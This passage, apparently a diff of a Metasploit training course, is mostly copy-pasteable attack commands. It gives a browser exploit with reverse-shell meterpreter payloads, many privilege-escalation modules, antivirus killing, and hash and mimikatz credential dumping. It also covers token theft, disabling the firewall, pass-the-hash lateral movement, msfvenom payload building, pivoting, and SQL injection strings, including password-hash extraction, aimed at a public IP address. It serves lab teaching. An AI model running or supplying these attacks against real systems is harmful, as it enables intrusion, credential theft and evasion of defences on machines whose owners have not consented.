+Again, we can see that our stages are coded for particular operating systems and languages.
+We can take a look at shell.rb and see the shellcode that would be put into the payload that would be staged on the
+victim machine which would be encoded to tell the victim machine where to connect back to and what commands to run,
+if any.
+ 
+- Other module directories include nops, encoders, and post. Post modules are what are used in sessions that have
+already been opened in meterpreter, to gain more information on the victim machine, collect hashes, or even tokens,
+so we can impersonate other users on the system in hopes of elevating our privileges.
+---------------------------Type This-----------------------------------
+cd ../../../post/
+ls
+cd windows/
+ls
+-----------------------------------------------------------------------    
+ 
+ 
+Inside the windows directory we can see all the post modules that can be run, capture is a directory that holds all
+the modules to load keyloggers, or grab input from the victim machine. Escalate has modules that will try to
+escalate our privileges. Gather has modules that will try to enumerate the host to get as much information as
+possible out of it. WLAN directory holds modules that can pull down WiFi access points that the victim has in
+memory/registry and give you the AP names as well as the WEP/WPA/WPA2 key for the network.
+ 
+ 
+ 
+###################################################
+# Section 2: Actually Using Metasploit (For real) #
+###################################################
+---------------------------Type This-----------------------------------
+sudo /sbin/iptables -F
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+-----------------------------------------------------------------------
+ 
+##############################################
+# Run any Linux command inside of MSFConsole #
+##############################################
+ 
+---------------------------Type This-----------------------------------
+ls
+ 
+pwd
+ 
+ping -c1 yahoo.com
+ 
+nmap 192.168.11.130
+ 
+nmap yahoo.com
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- You're on the outside scanning publicly accessable targets.
+ 
+ 
+---------------------------Type This-----------------------------------
+use auxiliary/scanner/portscan/tcp
+ 
+set RHOSTS 162.243.126.247
+ 
+set PORTS 80,443,445                      
+ 
+run
+------------------------------------------------------------------------
+ 
+- In my opinion a much better option is a script called 'discover' from Lee Baird.
+ 
+- You can get it here: https://github.com/leebaird/discover
+ 
+- On the Ubuntu attack host you can run discover by typing the following:
+---------------------------Type This-----------------------------------
+cd ~/toolz/discover
+sudo ./discover
+-----------------------------------------------------------------------
+ 
+- From here you can just follow the prompts. It will run both Nmap NSE scripts and Metasploit aux modules with all of the correct parameters for you.
+ 
+ 
+##################################
+# Basic Client-Side Exploitation #
+##################################
+---------------------------Type This-----------------------------------
+sudo /sbin/iptables -F
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use exploit/windows/browser/ie_cgenericelement_uaf
+ 
+set ExitOnSession false
+ 
+set URIPATH /ie8
+ 
+set PAYLOAD windows/meterpreter/reverse_tcp
+ 
+set LHOST 192.168.11.129                                            
+ 
+exploit -j
+----------------------------------------------------------------------
+ 
+- Now from the Win7 host, use Internet Explorer 8 to connect to the exploit address (local address)
+- given to you by metasploit.
+ 
+- The address will be something like:
+ 
+http://192.168.11.129:8080/ie8                                            (Make sure you change this to your ubuntu ip address)
+ 
+ 
+ 
+- This will simulate a victim clicking on your malicious link and being exploited with a browser exploit.
+ 
+ 
+###########################
+# Client-Side Enumeration #
+###########################
+ 
+ 
+- You can list the active sessions by typing:
+---------------------------Type This-----------------------------------
+sessions -l
+ 
+ 
+ 
+ 
+- You can "interact" with any active session by typing sessions -i 3 (replace 3 with the session number you want to interact with)
+ 
+---------------------------Type This-----------------------------------
+sessions -i 1
+ 
+ 
+ 
+ 
+ 
+- You should now see Metasploit's meterpreter prompt.
+ 
+ 
+********************************** Figure out who and where you are **********************************
+ 
+---------------------------Type This-----------------------------------
+meterpreter> sysinfo
+ 
+ 
+meterpreter> getuid
+ 
+ 
+meterpreter> ipconfig
+ 
+ 
+meterpreter> run post/windows/gather/checkvm
+ 
+ 
+ 
+ 
+********************************** Escalate privileges and get hashes **********************************
+ 
+ 
+--Option 1: GetSystem
+---------------------------Type This-----------------------------------
+meterpreter> getsystem
+ 
+--Option 2:
+---------------------------Type This-----------------------------------
+meterpreter > run post/windows/escalate/getsystem
+ 
+--Option 3:
+---------------------------Type This-----------------------------------
+meterpreter> background
+back
+use post/windows/escalate/droplnk
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.11.129                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 1234
+exploit
+ 
+--Option 4:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/bypassuac
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.11.129                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 12345
+exploit
+ 
+--Option 5:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/service_permissions
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.11.129                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 5555
+exploit
+ 
+--Option 6:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/trusted_service_path
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.11.129                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 4567
+exploit
+ 
+ 
+--Option 7:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/ppr_flatten_rec
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.11.129                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 7777
+exploit
+ 
+--Option 8:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/ms_ndproxy
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.11.129                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 7788
+exploit
+ 
+ 
+--Option 9:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/ask
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.11.129                                            (Make sure you change this to your ubuntu ip address)
+set LPORT 7799
+exploit
+ 
+ 
+meterpreter > getuid
+Server username: win7-64-victim\Workshop
+meterpreter > getsystem
+...got system (via technique 1).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+ 
+--------------------------------------------------------
+ 
+meterpreter> run killav
+ 
+meterpreter> run post/windows/gather/hashdump
+ 
+meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
+ 
+meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)
+ 
+meterpreter> run post/windows/gather/credentials/credential_collector
+-----------------------------------------------------------------------
+ 
+#####################
+# Fix broken PSExec #
+#####################
+- We use the shell command to get to the Victim Dos command so we can add a registry field.
+---------------------------Type This-----------------------------------
+meterpreter > execute -c -H -f cmd -a "/k" -i
+ 
+ 
+ 
+- Created a registry field to the Victim computer, this will allow us to access the machine using and exploit via PSEXEC.
+---------------------------Type This-----------------------------------
+C:\Windows\system32> reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system  /v LocalAccountTokenFilterPolicy  /t REG_DWORD  /d  1
+ 
+---------------------------Type This-----------------------------------
+c:\Windows\system32> netsh advfirewall set allprofiles state off
+ 
+********************************** Steal Tokens **********************************
+---------------------------Type This-----------------------------------
+meterpreter > getsystem
+ 
+meterpreter > use incognito
+ 
+meterpreter > list_tokens -u
+ 
+meterpreter > list_tokens -g
+---------------------------Type This-----------------------------------
+ 
+NOTE: These commands will not work as your VM is not connected to Active Directory. They are provided so you can have the syntax.
+ 
+---------------------------Type This-----------------------------------
+meterpreter > impersonate_token                         <-- choose who you want to impersonate but be sure to use 2 slashes in the name (ex: impersonate_token domain\\user)
+ 
+meterpreter> getuid
+ 
+ 
+************ Stealing credentials and certificates ************
+- NOTE: Most of the stuff after 'kerberos' DOES NOT work, but is given here so you know the correct syntax to use when connected to AD or dealing with smart/CAC cards.
+---------------------------Type This-----------------------------------
+meterpreter > getsystem
+ 
+meterpreter > load mimikatz
+ 
+meterpreter > kerberos
+ 
+ 
+NOTE: These commands will not work as your VM is not connected to Active Directory. They are provided so you can have the syntax.
+ 
+ 
+meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
+ 
+meterpreter > msv                                                               <-- Your AD password
+ 
+meterpreter > livessp                                                           <-- Your Windows8 password
+ 
+meterpreter > ssp                                                               <-- Your outlook password
+ 
+meterpreter > tspkg                                                             <-- Your AD password
+ 
+meterpreter > wdigest                                                           <-- Your AD password
+ 
+meterpreter > mimikatz_command -f crypto::listStores
+ 
+meterpreter > mimikatz_command -f crypto::listCertificates
+ 
+meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
+ 
+meterpreter > mimikatz_command -f crypto::patchcapi
+ 
+meterpreter> search -d <directory> -f <file-pattern>
+ 
+ 
+********************************** Enumerate the host you are on **********************************
+---------------------------Type This-----------------------------------
+meterpreter > run post/windows/gather/enum_applications
+ 
+meterpreter > run post/windows/gather/enum_logged_on_users
+ 
+meterpreter > run post/windows/gather/usb_history
+ 
+meterpreter > run post/windows/gather/enum_shares
+ 
+meterpreter > run post/windows/gather/enum_snmp
+ 
+meterpreter> reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+ 
+ 
+ 
+********************************** Lateral Movement *******************************
+ 
+ 
+Now we can run the PSEXEC exploit.
+-- Option 1:
+---------------------------Type This-----------------------------------
+use exploit/windows/smb/psexec
+ 
+set SMBUser Workshop
+ 
+set SMBPass password
+ 
+set RHOST 192.168.11.130
+ 
+set payload windows/meterpreter/reverse_tcp
+ 
+set LHOST 192.168.11.129
+ 
+set LPORT 2345
+ 
+exploit
+ 
+ 
+ 
+ 
+-- Option 2:
+---------------------------Type This-----------------------------------
+use exploit/windows/smb/psexec
+ 
+set SMBUser Workshop
+ 
+set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+ 
+set payload windows/meterpreter/reverse_tcp
+ 
+set RHOST 192.168.11.130                      
+ 
+set LHOST 192.168.11.129
+ 
+set LPORT 5678
+ 
+exploit
+ 
+ 
+##################
+# Day 2 Homework #
+##################
+ 
+---------------------------------------------------------------------------------
+ 
+Day 2 Homework:
+Send Ivana an email ivana{a-t}strategicsec{d-o-t}.com with a word document that contains screenshots of everything that we have covered so far. Make the subject of the email "First Name - Last Name - Metasploit Day 2" (ex: Joseph - McCray - Metasploit Day 2).
+ 
+Please take screenshots of you doing the first 10 videos in this playlist and add them to this document.
+https://www.youtube.com/playlist?list=PL1512BD72E7C9FFCA
+ 
+Also be sure to name the attached file "FirstName.LastName.MetasploitDay2.docx" (Joseph.McCray.MetasploitDay2.docx).
+ 
+NOTE: This is what is required in order to receive your certificate of completion and CPEs.
+---------------------------------------------------------------------------------
+ 
+ 
+ 
+#################################################
+# Section 3: Writing Meterpreter Resource Files #
+#################################################
+ 
+ 
+- In this lab we are going to create a binary payload via msfpayload then craft a .rc file that automates the
+process to setup the multi handler listener.
+ 
+- We will start off by creating the msfvenom
+---------------------------Type This-----------------------------------
+sudo /sbin/iptables -F
+    strategicsec
+ 
+cd ~/toolz/metasploit
+ 
+./msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=192.168.11.129 -f exe > /home/infosecaddicts/Desktop/meterpreter.exe
+ 
+sudo chmod 777 /home/infosecaddicts/Desktop/meterpreter.exe
+ 
+- In the syntax above, we set the payload, set the local host address to connect back too, then redirected the
+malicious payload to our desktop by issuing the correct path. We will also change the permissions on it to 777 just
+to make it easy for us to use WinSCP to copy it over to our Win7 machine.
+ 
+- Next we are going to create a .rc (resource file) file that will automate the process for setting up a listener.
+ 
+- Navigate to the /home/infosecaddicts/toolz/metasploit/ so that when you create the .rc file you can save it in the
+working directory.
+ 
+ 
+- Type 'touch meterpreter.rc' to create the file.
+---------------------------Type This-----------------------------------
+touch meterpreter.rc
+ 
+- Type 'echo use exploit/multi/handler  >> meterpreter.rc' to be appended to the .rc file.
+echo use exploit/multi/handler  >> meterpreter.rc
+ 
+- Type 'echo set PAYLOAD windows/meterpreter/reverse_tcp  >> meterpreter.rc' to be appended to the .rc file.
+echo set PAYLOAD windows/meterpreter/reverse_tcp  >> meterpreter.rc
+ 
+- Type 'echo set LHOST 192.168.11.129>> meterpreter.rc' to be appended to the .rc file.
+echo set LHOST 192.168.11.129>> meterpreter.rc
+ 
+- Type 'echo exploit -j -z >> meterpreter.rc' to be appended to the .rc file.
+echo exploit -j -z >> meterpreter.rc
+ 
+- Then cat the meterpreter.rc out to verify that everything in the file looks ok.
+cat meterpreter.rc
+ 
+Now at the command prompt, type 'sudo ./msfconsole -r meterpreter.rc' to start the msfconsole module and call/run
+ 
+the 'meterpreter.rc' file.
+./msfconsole -r meterpreter.rc
+ 
+- Once the msfconsole starts, the meterpreter resource file is executed and the listener is automatically setup.  It is now listening for a connection!
+ 
+- Now you must transfer the malicious meterpreter payload to the victim machine (you may do so by any means necessary, we have physical access so we transferred it via usb.
+ 
+- Click on the payload and create the meterpreter session.
+ 
+- Type 'sessions -l' to list your open sessions, and 'sessions -i 1' to indicate that you want to interact with
+ 
+meterpreter session under id 1.
+ 
+exit -y
+       
+ 
+ 
+ 
+***********************************
+* Getting Serious About .rc files *
+***********************************
+ 
+---------------------------Type This-----------------------------------
+touch /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+ 
+echo run getcountermeasure >> /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+ 
+echo run winenum >> /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+ 
+echo run post/windows/gather/enum_applications >> /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+ 
+echo run post/windows/gather/enum_logged_on_users >> /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+ 
+echo run post/windows/gather/checkvm >> /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+ 
+ 
+ 
+- Ok, that was fun. Now let's take a quick look at the .rc file we just created.
+---------------------------Type This-----------------------------------
+cat /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+ 
+ 
+ 
+ 
+touch /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+ 
+ 
+echo use exploit/windows/browser/ie_cgenericelement_uaf >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo set ExitOnSession true >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo set URIPATH /ie8 >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo set PAYLOAD windows/meterpreter/reverse_tcp >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo set LHOST 192.168.11.129 >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc                            
+ 
+           
+ 
+echo set AutoRunScript multi_console_command -rc /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+ 
+echo exploit -j -z >> /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+ 
+ 
+ 
+- Ok, that was more fun than the previous one. Now let's take a quick look at the .rc file we just created.
+---------------------------Type This-----------------------------------
+cat /home/infosecaddicts/toolz/metasploit/autorun-walk-through.rc
+ 
+cat /home/infosecaddicts/toolz/metasploit/old-faithful-ie8.rc
+ 
+- Alright, enough already. Let's run this thing.
+./msfconsole -r old-faithful-ie8.rc
+ 
+ 
+ 
+###########################################
+# Section 4: Custom Meterpreter Scripting #
+###########################################
+---------------------------Type This-----------------------------------
+cd ~
+mkdir binaries
+cd ~/binaries
+wget https://s3.amazonaws.com/infosecaddictsfiles/wce.exe
+wget https://s3.amazonaws.com/infosecaddictsfiles/nc.exe
+wget https://s3.amazonaws.com/infosecaddictsfiles/mimikatz.exe
+-----------------------------------------------------------------------
+- In this lab we will be looking at how you can use some custom Meterpreter scripts to do more than what Metasploit
+ 
+can offer.  This will also show you the flexibility of the Meterpreter scripts.
+ 
+- We're going to start off with a simple Hello World script first.  
+ 
+---------------------------Type This-----------------------------------  
+echo 'print_status("Hello World")' > /home/infosecaddicts/toolz/metasploit/scripts/meterpreter/helloworld.rb
+-----------------------------------------------------------------------
+ 
+- This next portion is up to you, exploit your test box and end up with a Meterpreter shell.
+ 
+- Lets test out our helloworld.rb Meterpreter script.
+ 
+---------------------------Type This-----------------------------------
+meterpreter> run helloworld
+ 
+ 
+- So far so good, now we can build on this base.  Lets add a couple more API calls to the script.
+ 
+- Open /home/infosecaddicts/toolz/metasploit/scripts/meterpreter/helloworld.rb in your favorite and add following
+ 
+line.
+---------------------------Type This-----------------------------------
+vi /home/infosecaddicts/toolz/metasploit/scripts/meterpreter/helloworld.rb
+ 
+ 
+---------------------------Type This-----------------------------------
+print_error("this is an error!")
+print_line("this is a line")
+ 
+- Now run the script:
+ 
+meterpreter> run helloworld
+ 
+ 
+- Now that we have the basics down, we're going to do something a little more exciting.  
+- The architecture to follow when creating these scripts goes as follows:
+ 
+def getinfo(session)
+        begin
+            <stuff goes here>
+        rescue ::Exception => e
+            <stuff goes here>
+        end
+end
+ 
+-----------------------------------------------------------------------
+- Copy and paste the following code into our helloworld.rb script:
+---------------------------Type This-----------------------------------
+def getinfo(session)
+    begin
+       sysnfo = session.sys.config.sysinfo
+       runpriv = session.sys.config.getuid
+       print_status("Getting system information ...")
+       print_status("The target machine OS is #{sysnfo['OS']}")
+       print_status("The computer name is #{'Computer'} ")
+       print_status("Script running as #{runpriv}")
+    rescue ::Exception => e
+      print_error("The following error was encountered #{e}")
+   end
+end
+ 
+getinfo(client)
+--------------------------------------------------------------------------
+ 
+ 
+- Now run the script:
+---------------------------Type This-----------------------------------
+meterpreter> run helloworld
+ 
+ 
+- We can expand it by adding actual system commands to the script, lets look at how we can do this.
+ 
+---------------------------Type This-----------------------------------
+def list_exec(session,cmdlst)
+    print_status("Running Command List ...")
+    r=''
+    session.response_timeout=120
+    cmdlst.each do |cmd|
+       begin
+          print_status "running command #{cmd}"
+          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
+          while(d = r.channel.read)
+ 
+             print_status("#{d}")
+          end
+          r.channel.close
+          r.close
+       rescue ::Exception => e
+          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
+       end
+    end
+ end
+ 
+commands = [ "set",
+    "ipconfig  /all",
+    "arp -a"]
+ 
+list_exec(client,commands)
+------------------------------------------------------------------------
+ 
+ 
+- Run the script:
+---------------------------Type This-----------------------------------
+meterpreter> run helloworld
+ 
+ 
+Note: Add all of the commands from the script below to your helloworld.rb script:
+https://raw.githubusercontent.com/rapid7/metasploit-framework/master/scripts/meterpreter/winenum.rb
+ 
+ 
+ 
+---------------------------------------------------------------------------------
+ 
+ 
+###########################################
+# Section 3: Tunneling For Fun and Profit #
+###########################################
+ 
+*****************************Enumerate the network you are on ***************************
+ 
+meterpreter > run netenum
+ 
+meterpreter > run netenum -ps -r 192.168.200.0/24
+ 
+meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.200.0/24
+ 
+ 
+ 
+********************************** Set up your Pivot **********************************
+ 
+meterpreter > background
+                                                        <-- background the session
+        You want to get back to this prompt:
+        msf exploit(handler) > back                     <--- you need to get to main msf> prompt
+ 
+ 
+ 
+        sessions -l                                     <--find a session you want to pivot through (note the IP and session number)
+       
+        Now set up Pivot with a route add
+        ---------------------------------
+ 
+route print
+ 
+route add CHANGEME-TO-YOUR-WIN7-IP 255.255.255.0 1                       <-- Use correct session id (2), it may be 3, or 4 (make sure you are on msf> prommpt, not meterpreter)
+ 
+ 
+route print                                             <----- verify new route
+ 
+******************************Scan through your Pivot ******************************
+ 
+use auxiliary/scanner/portscan/tcp                      <-- Run aux modules through your pivot
+ 
+set THREADS 10
+ 
+set RHOSTS 192.168.200.0/24             <-- Keep changing this IP and re-running the scan until you find something you want to attack
+ 
+set PORTS 445
+ 
+run
+
+
+####################################
+# Socks Tunneling with Proxychains #
+####################################
+--- Open a duplicate putty session to your Ubuntu host
+ 
+sudo apt-get install -y proxychains
+    strategicsec
+ 
+sudo vi /etc/proxychains.conf                           <--- Make sure that last line of the file is: socks4  127.0.0.1 1080
+ 
+        Comment out the proxy_dns, change the 9050 (tor port) to the metasploit socks proxy port (1080) and save it.
+        socks4  127.0.0.1 1080
+ 
+***************************Set up a Socks Proxy through your Pivot *************************
+ 
+ 
+use auxiliary/server/socks4a
+ 
+set SRVHOST 127.0.0.1
+ 
+set SRVPORT 1080
+ 
+run
+ 
+        --- Go back to your other putty session with the meterpreter shell
+cd ~
+ 
+proxychains nmap -sT -PN -vv -sV --script=smb-os-discovery.nse -p 445 192.168.200.0/24          <--- This is going to be really slow
+ 
+proxychains nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,1433,1521,3306,3389,8080,10000 192.168.200.0/24           <--- This is going to be really slow
+ 
+ 
+        ---close the duplicate putty session to your Ubuntu host
+
+##################################
+# Basic: Web Application Testing #
+##################################
+ 
+Most people are going to tell you reference the OWASP Testing guide.
+https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
+ 
+I'm not a fan of it for the purpose of actual testing. It's good for defining the scope of an assessment, and defining attacks, but not very good for actually attacking a website.
+ 
+ 
+The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
+   
+    1. Does the website talk to a DB?
+        - Look for parameter passing (ex: site.com/page.php?id=4)
+        - If yes - try SQL Injection
+ 
+    2. Can I or someone else see what I type?
+        - If yes - try XSS
+ 
+    3. Does the page reference a file?
+        - If yes - try LFI/RFI
+ 
+Let's start with some manual testing against 54.245.184.121
+ 
+ 
+Start here:
+http://54.245.184.121/
+ 
+ 
+There's no parameter passing on the home page so the answer to question 1 is NO.
+There is however a search box in the top right of the webpage, so the answer to question 2 is YES.
+ 
+Try an XSS in the search box on the home page:
+<script>alert(123);</script>
+ 
+Doing this gives us the following in the address bar:
+http://54.245.184.121/BasicSearch.aspx?Word=<script>alert(123);</script>
+ 
+Ok, so we've verified that there is XSS in the search box.
+ 
+Let's move on to the search box in the left of the page.
+ 
+Let's give the newsletter signup box a shot
+ 
+Moving on to the login page.
+http://54.245.184.121/login.aspx
+ 
+I entered a single quote (') for both the user name and the password. I got the following error:
+ 
+Let's try throwing a single quote (') in there:
+ 
+http://54.245.184.121/bookdetail.aspx?id=2'
+ 
+ 
+I get the following error:
+ 
+Unclosed quotation mark after the character string ''.
+Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.
+ 
+Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ''.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+#########################################################################################
+# SQL Injection                                                                         #
+# https://s3.amazonaws.com/infosecaddictsfiles/1-Intro_To_SQL_Intection.pptx #
+#########################################################################################
+ 
+ 
+- Another quick way to test for SQLI is to remove the paramter value
+ 
+ 
+#############################
+# Error-Based SQL Injection #
+#############################
+http://54.245.184.121/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
+http://54.245.184.121/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(1))--
+http://54.245.184.121/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(2))--
+http://54.245.184.121/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(3))--
+http://54.245.184.121/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(4))--
+http://54.245.184.121/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(N))--     NOTE: "N" - just means to keep going until you run out of databases
+http://54.245.184.121/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85))--
+http://54.245.184.121/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'bookmaster')--
+http://54.245.184.121/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'sysdiagrams')--
+ 
+ 
+ 
+ 
+#############################
+# Union-Based SQL Injection #
+#############################
+http://54.245.184.121/bookdetail.aspx?id=2 order by 100--
+http://54.245.184.121/bookdetail.aspx?id=2 order by 50--
+http://54.245.184.121/bookdetail.aspx?id=2 order by 25--
+http://54.245.184.121/bookdetail.aspx?id=2 order by 10--
+http://54.245.184.121/bookdetail.aspx?id=2 order by 5--
+http://54.245.184.121/bookdetail.aspx?id=2 order by 6--
+http://54.245.184.121/bookdetail.aspx?id=2 order by 7--
+http://54.245.184.121/bookdetail.aspx?id=2 order by 8--
+http://54.245.184.121/bookdetail.aspx?id=2 order by 9--
+http://54.245.184.121/bookdetail.aspx?id=2 union all select 1,2,3,4,5,6,7,8,9--
+ 
+    We are using a union select statement because we are joining the developer's query with one of our own.
+    Reference:
+    http://www.techonthenet.com/sql/union.php
+    The SQL UNION operator is used to combine the result sets of 2 or more SELECT statements.
+    It removes duplicate rows between the various SELECT statements.
+ 
+    Each SELECT statement within the UNION must have the same number of fields in the result sets with similar data types.
+ 
+http://54.245.184.121/bookdetail.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--
+ 
+    Negating the paramter value (changing the id=2 to id=-2) will force the pages that will echo back data to be displayed.
+ 
+http://54.245.184.121/bookdetail.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
+http://54.245.184.121/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
+http://54.245.184.121/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
+http://54.245.184.121/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--
+ 
+ 
+ 
+ 
+ 
+- Another way is to see if you can get the backend to perform an arithmetic function
+http://54.245.184.121/bookdetail.aspx?id=(2)
+http://54.245.184.121/bookdetail.aspx?id=(4-2)  
+http://54.245.184.121/bookdetail.aspx?id=(4-1)
+ 
+ 
+ 
+http://54.245.184.121/bookdetail.aspx?id=2 or 1=1--
+http://54.245.184.121/bookdetail.aspx?id=2 or 1=2--
+http://54.245.184.121/bookdetail.aspx?id=1*1
+http://54.245.184.121/bookdetail.aspx?id=2 or 1 >-1#
+http://54.245.184.121/bookdetail.aspx?id=2 or 1<99#
+http://54.245.184.121/bookdetail.aspx?id=2 or 1<>1#
+http://54.245.184.121/bookdetail.aspx?id=2 or 2 != 3--
+http://54.245.184.121/bookdetail.aspx?id=2 &0#
+ 
+ 
+
+http://54.245.184.121/bookdetail.aspx?id=2 and 1=1--
+http://54.245.184.121/bookdetail.aspx?id=2 and 1=2--
+http://54.245.184.121/bookdetail.aspx?id=2 and user='joe' and 1=1--
+http://54.245.184.121/bookdetail.aspx?id=2 and user='dbo' and 1=1--
+ 
+ 
+ 
+###############################
+# Blind SQL Injection Testing #
+###############################
+Time-Based BLIND SQL INJECTION - EXTRACT DATABASE USER
+     
+3 - Total Characters
+http://54.245.184.121/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+http://54.245.184.121/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+http://54.245.184.121/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--      (Ok, the username is 3 chars long - it waited 10 seconds)
+ 
+Let's go for a quick check to see if it's DBO
+http://54.245.184.121/bookdetail.aspx?id=2; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'--
+ 
+Yup, it waited 10 seconds so we know the username is 'dbo' - let's give you the syntax to verify it just for fun.
+ 
+D  - 1st Character
+http://54.245.184.121/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--  
+http://54.245.184.121/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
+http://54.245.184.121/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
+http://54.245.184.121/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--  (Ok, first letter is a 100 which is the letter 'd' - it waited 10 seconds)
+ 
+B - 2nd Character
+http://54.245.184.121/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+http://54.245.184.121/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+ 
+O - 3rd Character
+http://54.245.184.121/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+http://54.245.184.121/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
+http://54.245.184.121/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+http://54.245.184.121/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+http://54.245.184.121/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
+http://54.245.184.121/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'--      
+http://54.245.184.121/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=111) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+ 
+ 
+ 
+ 
+ 
+ ##########
+# Sqlmap #
+##########
+If you want to see how we automate all of the SQL Injection attacks you can log into your StrategicSec-Ubuntu-VM and run the following commands:
+
+cd /home/strategicsec/toolz/sqlmap-dev/
